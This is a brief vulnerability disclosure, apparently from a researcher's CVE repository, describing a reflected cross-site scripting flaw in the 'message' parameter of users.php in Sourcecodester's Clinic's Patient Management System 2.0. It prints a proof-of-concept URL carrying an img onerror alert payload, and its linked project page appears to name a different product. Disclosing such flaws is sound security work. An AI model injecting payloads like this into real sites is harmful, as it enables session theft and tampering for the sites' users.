# Reflected XSS vulnerability was discovered in Sourcecodester's Clinic's Patient Management System - PHP 2.0 (message)
---

---
Affected Project: Sourcecodester Clinic's Patient Management System - PHP 2.0

Official Website: [Sourcecodester Clinic's Patient Management System](https://www.sourcecodester.com/php/17556/contact-manager-export-vcf-using-php-and-mysql-source-code.html)

Version: 2.0

Releted Code: users.php
*Line Number: 256-259*

![image](https://github.com/gurudattch/CVEs/blob/main/assets/14.png)

---

![image1](https://github.com/gurudattch/CVEs/blob/main/assets/15.png)

---

Add the XSS payload in **message** parameter

`http://192.168.95.115/users.php?message="><img src=x onerror=alert()>`

---

![image2](https://github.com/gurudattch/CVEs/blob/main/assets/16.png)
